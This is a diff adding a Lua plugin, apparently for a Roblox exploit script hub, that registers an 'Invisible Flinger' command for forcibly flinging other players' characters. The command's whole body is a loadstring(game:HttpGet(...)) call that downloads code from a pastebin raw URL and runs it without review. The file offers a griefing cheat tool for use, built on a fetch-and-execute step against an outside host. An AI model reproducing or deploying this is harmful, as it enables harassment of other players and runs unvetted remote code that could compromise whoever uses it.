@@ -1,0 +1,16 @@
+local Plugin = {
+    ["PluginName"] = "Invisible Flinger",
+    ["PluginDescription"] = "Flings anybody the blue outline touches",
+    ["Commands"] = {
+        ["invisfling"] = {
+            ["ListName"] = "Flinger",
+            ["Description"] = "Invis fling",
+            ["Aliases"] = {"infling"},
+            ["Function"] = function(args,speaker)
+				loadstring(game:HttpGet("https://pastebin.com/raw/z92AX52m"))();
+            end     
+        },
+    }
+}
+
+return Plugin
